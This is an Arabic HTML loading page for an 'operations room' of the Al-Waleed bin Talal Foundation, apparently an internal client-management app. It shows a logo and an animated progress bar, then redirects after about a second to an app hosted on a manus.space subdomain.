<!doctype html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
    <title>غرفة عمليات مؤسسة الوليد بن طلال</title>
    <style>
      html, body { margin: 0; min-height: 100%; background: #070a12; color: #f3f7ff; font-family: Arial, sans-serif; }
      body { display: grid; min-height: 100vh; place-items: center; overflow: hidden; position: relative; text-align: center; }
      body::before { content: ""; position: fixed; inset: 0; opacity: .07; background: url('https://voicecall-uwxhmyez.manus.space/manus-storage/kingdom-watermark_411c4335.png') center/55% auto no-repeat; pointer-events: none; }
      main { width: min(88vw, 360px); position: relative; z-index: 1; }
      .logo { width: 112px; height: 112px; object-fit: cover; border-radius: 28px; display: block; margin: 0 auto 26px; box-shadow: 0 12px 45px #3b82f644; border: 1px solid #b8d2ff55; background: #111a2d; }
      h1 { font-size: 21px; margin: 0; line-height: 1.6; }
      p { color: #a8b7d0; font-size: 14px; margin: 8px 0 30px; }
      .track { height: 6px; border-radius: 999px; background: #1b2840; overflow: hidden; }
      .bar { width: 42%; height: 100%; border-radius: inherit; background: linear-gradient(90deg, #4e8dff, #b6d4ff); animation: load 1.5s ease-in-out infinite; }
      .status { margin-top: 12px; color: #96b9f5; font-size: 12px; }
      @keyframes load { 0% { transform: translateX(240%); } 100% { transform: translateX(-320%); } }
    </style>
  </head>
  <body>
    <main><img class="logo" src="https://voicecall-uwxhmyez.manus.space/manus-storage/institution-seal_f05d4825.jpg" alt="شعار المؤسسة" /><h1>غرفة عمليات مؤسسة الوليد بن طلال</h1><p>إدارة العملاء والمحادثات والطلبات بأمان</p><div class="track" aria-label="جاري التحميل"><div class="bar"></div></div><div class="status">جارٍ فتح غرفة العمليات…</div></main>
    <script>setTimeout(() => location.replace('https://voicecall-uwxhmyez.manus.space/'), 1100);</script>
  </body>
</html>
